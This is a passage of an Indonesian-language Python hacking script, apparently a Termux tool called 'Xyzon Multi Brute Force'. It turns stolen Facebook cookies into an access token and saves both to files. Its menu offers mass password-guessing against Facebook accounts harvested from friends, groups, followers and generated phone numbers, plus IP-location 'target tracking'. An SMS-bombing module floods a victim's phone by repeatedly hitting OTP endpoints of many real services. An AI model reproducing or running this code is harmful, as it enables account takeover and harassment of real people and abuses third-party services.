						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print(" [+] \33[1;92mLogin Berhasil | Ketik Perintah Di Bawah Ini")
							print(" [+] \33[1;96mpython run.py");exit()
			except Exception as e:
				print(" [+]\33[1;91m Cookies Tidak Dapat Di Akses")
				os.system('rm -rf .token.txt && rm -rf .cok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass
	        
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' [+]\33[1;91m Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(panel(f'[bold cyan]Terima Kasih Kepada [bold green]BintangTzy[bold cyan] Yang Telah Membuat Script Ini, Xyzon Multi Brute Force',width=90,style=f"bold red"))
	cetak(panel(f'[bold white][[bold green]•[/][bold white]][/] [bold cyan]Username : [bold yellow]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Idz : [bold yellow]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold cyan]User Ip  : [bold yellow]{ip}[/][/][bold white]\n[[bold green]•[/][bold white]][/] [bold cyan]Status   : [bold green]Premium ',width=90,title=f"[bold red][[bold green] Informasi pengguna [bold red]]",style=f"bold red"))
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold cyan]Crack ID From Pubilc Friends [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold cyan]Crack ID From Random Massal [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold cyan]Crack ID From Username [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]04[/][bold white]][/] [bold cyan]Crack ID From Member Grup [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]05[/][bold white]][/] [bold cyan]Crack ID From Total Followers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]06[/][bold white]][/] [bold cyan]Crack ID From Email Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]07[/][bold white]][/] [bold cyan]Crack ID From File Kita [bold white][[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold cyan]Crack ID From Nomor Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]09[/][bold white]][/] [bold cyan]Check Hasil Crack [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]10[/][bold white]][/] [bold cyan]Chekpoint Detector [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]11[/][bold white]][/] [bold cyan]Get Headers [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]12[/][bold white]][/] [bold cyan]Lacak IP Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]13[/][bold white]][/] [bold cyan]Spam Sms Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]14[/][bold white]][/] [bold cyan]Spam WhatsApp Target [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]15[/][bold white]][/] [bold cyan]Ingfo Author [bold yellow]XMBF [bold white][[bold green] ON [bold white]]\n[bold white][[bold green]16[/][bold white]][/] [bold cyan]Report Bug Script [bold white][[bold green] ON [bold white]]\n[bold white][[bold red]00[/][bold white]][/] [bold red]Hapus Cookies [bold white][[bold green] ON [bold white]][/]',width=90,title=f"[bold red][[bold green] List menu [bold red]]",style=f"bold red"))
	cetak(panel(f'\t[bold Red]Warning[bold cyan] Gunakan Script Ini Dengan Baik Jangan Di Salah Gunakan [bold green]By XyzonXD',width=90,title=f"[bold red][[bold green] Informasi Crack [bold red]]",style=f"bold red"))
	_____xyzon___xd____ = input(f' {P}[{H}+{P}] \33[1;96mPilih Menu Crack : {P}')
	if _____xyzon___xd____ in ['1','01']:
		xyzoncrackpublik()
	elif _____xyzon___xd____ in ['2','02']:
		dump_massal()
	elif _____xyzon___xd____ in ['3','03']:
		crack_nama()
	elif _____xyzon___xd____ in('4','04'):
		crack_group()
	elif _____xyzon___xd____ in('5','05'):
		pengikut()
	elif _____xyzon___xd____ in('6','06'):
		crack_email()
	elif _____xyzon___xd____ in('7','07'):
		crack_file()
	elif _____xyzon___xd____ in('8','08'):
		crack_nomor()
	elif _____xyzon___xd____ in('9','09'):
		result()
	elif _____xyzon___xd____ in('10','010'):
		file_cp()
	elif _____xyzon___xd____ in('11','011'):
		siu()
	elif _____xyzon___xd____ in('12','012'):
		lacak_ip()
	elif _____xyzon___xd____ in('13','013'):
		spam_sms()
	elif _____xyzon___xd____ in('14','014'):
		spam_wa()
	elif _____xyzon___xd____ in('15','015'):
		info_ngentod()
	elif _____xyzon___xd____ in('16','016'):
		cetak(panel(f"[bold cyan]Apapun Bug Pada Script Tolong Laporkan Kepada Saya Agar Bisa Mengembangkan Sc Ini Semakin Dikit Bugnya Semakin Baik Sc Ini , Anda Akan Di Arahkan Ke WhatsApp",width=90,title=f"[bold red][[bold green] Report Bug [bold red]]",style=f"bold red"))
		os.system("xdg-open https://wa.me/+6282183929059?text=Asalammualikum+Bang+Saya+Mau+Melaporkan+Bug+Pada+Sc+Mu+Bang")
		time.sleep(3)
		exit()
	elif _____xyzon___xd____ in('ahhh','vvvk'):
		os.system("xdg-open https://yandex.eu/")
	elif _____xyzon___xd____ in('0','00'):
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' [+]{m} Sukses Logout{x}')
		time.sleep(5)
		login()
	else:
		print(' [+]\33[1;91m Pilih Yang Bener Asu ')
		back()
def error():
	print(f' [+]\33[1;91m Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
#----------------HEADERSS-----------------#
def siu():
	start()
	get_data_web()
	akhir()
#----------------------[ LACAK IP ]----------------------#
def lacak_ip():
    b = input(f' \x1b[1;97m[\x1b[1;92m?\x1b[1;97m]\x1b[1;93m \x1b[1;96mMasukkan IP Target : \x1b[1;93m')
    if b in [""]:
        jalan("\nIsi Yang Benar !")
        menu()
    a = requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    try:
        bn = a["status"]
    except KeyError:
        bn = " "
    try:
        ng = a["country"]
    except KeyError:
        ng = " "
    try:
        cc = a["countryCode"]
    except KeyError:
        cc = " "
    try:
        pr = a["regionName"]
    except KeyError:
        pr = " "
    try:
        kt = a["city"]
    except KeyError:
        kt = " "
    try:
        kb = a["zip"]
    except KeyError:
        kb = " "
    try:
        tz = a["timezone"]
    except KeyError:
        tz = " "
    try:
        sp = a["isp"]
    except KeyError:
        sp = " "
    jalan("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mStatus : \x1b[1;93m" + bn)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mIP Target : \x1b[1;93m" + ip)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mNegara : \x1b[1;93m" + ng)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKode Negara : \x1b[1;93m" + cc)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mProvinsi : \x1b[1;93m" + pr)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKota : \x1b[1;93m" + kt)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mKode Pos : \x1b[1;93m" + kb)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mZona Waktu : \x1b[1;93m" + tz)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mProvider : \x1b[1;93m" + sp)
    jalan(" \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mInfo Lengkap : http://ip-api.com/#" + ip)
    exit()
#------------------[ CRACK NOMOR ]-------------------# 
def crack_nomor():
	cetak(nel('  [bold cyan]Crack Menggunakan Nomor Wajib Menggunakan Sandi Manual Saat Crack ',width=90,title=f"[bold red][[bold green] Crack Nomor [bold red]]",style=f"bold red"))
	depan = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96m Awalan Nomor :\x1b[1;97m ')
	if len(depan)==3:pass
	else:exit(f' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mContoh Awalan Nomor 08 (Kosong Delapan)')
	jumla = input(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m \x1b[1;96mJumlah :\x1b[1;97m ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in dump:pass
		else:dump.append(D+'|123456')
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	setting()
#-------------------[ DOA HALAL ]-----------------------#
def doa_halal():
	cetak(nel(f'''{H2}[{K2}+{H2}] {H2}Versi Arab Stay Halal : [bold cyan]  لَّهُمَّ إِنِّيْ ظَلَمْتُ نَفْسِيْ ظُلْمًا كَثِيْرًا، وَلاَ يَغْفِرُ الذُّنُوْبَ إِلاَّ أَنْتَ، فَاغْفِرْ لِيْ مَغْفِرَةً مِنْ عِنْدِكَ، وَارْحَمْنِيْ، إِنَّكَ أَنْتَ الْغَفُوْرُ الرَّحِيْمُ
{H2}[{K2}+{H2}] {H2}Versi Latin Stay Halal : [bold cyan]Allaahumma innii zholamtu nafsi zhulman katsiiron, wa laa yaghfirudz-dzunuuba illaa anta, faghfir lii maghfirotan min 'indika, warhamni, innaka antal ghofuurur-rahim''',width=90,title=f"[bold red][[bold green] Doa Crack [bold red]]",style=f"bold red"))
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('DUMP')
	except FileNotFoundError:
		print(' [+] \x1b[1;91mFile Tidak Ditemukan ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] \x1b[1;91mKamu Tidak Memiliki File Dump ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				print(f'\n %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				print(' [+] %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
		geeh = input(' [+] \x1b[1;96mPilih :\x1b[1;97m ')
		try:geh = lol[geeh]
		except KeyError:
			print(f' [+] \x1b[1;91mPilih Yang Bener Kontol {x}')
			time.sleep(3)
			back()
		try:lin = open('DUMP/'+geh,'r').read().splitlines()
		except:
			print(' [+] \x1b[1;91mFile Tidak Ditemukan, Coba Lagi Nanti ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		setting()
def info_ngentod():
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(                                     p+""+h+"       ["+m+" >>"+k+"  HALLO WORLD  "+m+"<< "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	jalan(                                     p+""+h+"       ["+m+" >>"+O+"Xyzon It's Expert Builder"+m+"<< "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(            p+""+h+"        ["+k+" Info Created and Team "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	jalan(            p+""+h+"        ["+k+" TERMUX INDONESIA Team 2023 "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(            p+""+h+"        ["+k+" Created Script "+h+"]");time.sleep(0.03)
	jalan(            p+""+m+"   • "+h+"BintangTzy");time.sleep(0.03)
	jalan(            p+""+m+"   • "+h+"Xyzon Dev");time.sleep(0.03)
	jalan(            p+""+m+"   • "+h+"BrayennnXD");time.sleep(0.03)
	jalan(            p+""+m+"   • "+h+"Alvino");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(            p+""+h+"        ["+k+" Team Script "+h+"]");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"BintangTzy");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Xyzon Dev");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"BrayennnXD");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Alvino");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Ang-Cyber");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"YayanXD");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Romz");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Yuume");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Asep");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Dapunta");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Jarr-XD");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Indraa");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Hikmatt");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Ditzy");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Rafii-XD");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Denni");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"Caca");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"AroulXD");time.sleep(0.03)
	print(            p+""+m+"   • "+h+"FajarID");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(           p+""+h+"   ["+k+" Hubungi Saya Di "+h+"]");time.sleep(0.03)
	jalan(           p+""+h+"   ["+k+" Nomor Di Bawah Ini "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	jalan(           p+""+m+"   • "+h+"Whatsapp¹  "+k+": "+O+"+62 821-8392-9059");time.sleep(0.03)
	jalan(           p+""+m+"   • "+h+"Whatsapp²  "+k+": "+O+"+62 821-8041-7034");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(          p+""+h+"   ["+k+" Follow Github Me "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"github¹ "+k+": "+O+"https://github.com/Ramzgod");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"github² "+k+": "+O+"https://github.com/BrayennnXD");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"github³ "+k+": "+O+"https://github.com/Al-vino");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(          p+""+h+"         ["+k+" Follow Facebook Me "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"Facebook "+k+": "+O+"XyzonXD");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"Link Fb  "+k+": "+O+"https://www.facebook.com/100077866622074");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"Facebook "+k+": "+O+"BrayennnXD");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"Link Fb  "+k+": "+O+"https://www.facebook.com/raihan.cayankkmu");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"Facebook "+k+": "+O+"Alvino");time.sleep(0.03)
	jalan(          p+""+m+"   • "+h+"Link Fb  "+k+": "+O+"https://www.facebook.com/profilphp?mibextid=ZbWKwL");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(         p+""+h+"          ["+k+" Please Support and Follow We!! "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	jalan(         p+""+h+"          ["+k+" Please Give A Star On My Github");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
	jalan(         p+""+h+"         ["+k+" Don't Forget To Follow My Facebook And Github "+h+"]");time.sleep(0.03)
	jalan(         p+""+h+"         ["+k+" Thanks You "+O+"(>•,•<) "+h+"]");time.sleep(0.03)
	print(M+"________________________________________________________________________________________");time.sleep(0.03)
#	raw_input (" [ ENTER ]")
	sayangku = input(p+""+h+" ["+k+" Tekan Enter "+h+"] ")
	back()
###----------[ DUMP PENGIKUT ]---------- ###
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri",width=90,title=f"[bold red][[bold green] Crack Folowers [bold red]]",style=f"bold red"))
	akun = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r {P}[{H}+{P}] \33[1;96mMengumpulkan {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"\33[1;96mBerhasil Mengumpulkan {len(id)} Idz",width=90,title=f"[bold red][[bold green] Mengumpulkan Idz [bold red]] ",style=f"bold red"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" [+] \33[1;91mKoneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" [+] \33[1;91mGagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()
#------------------[ DEFF SPAM SMS ]-------------------#

agent = random.choice(
		[
			"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
			"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
			"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
	]
)

def process_data1():
	sleep(0.10)
	
def spam_sms():
	global nomor 
	cetak(panel(f'''  [bold cyan]Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,title=f"[bold red][[bold green] Spam Sms [bold red]]",style=f"bold red"))
	nomor = input(f" {P}[{H}+{P}]\33[1;96m Input No Hp : {P}+62").replace("+62","")
	if nomor == "":
		pass
	else:
		while True:
			for _ in track(range(100), description=f' {P}[{H}+{P}]\33[1;96m Sedang Spam...'):process_data1()
			sxp_sms()

class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "user-agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"Hallo Mantan",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "user-agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "user-agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "user-agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"user-agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
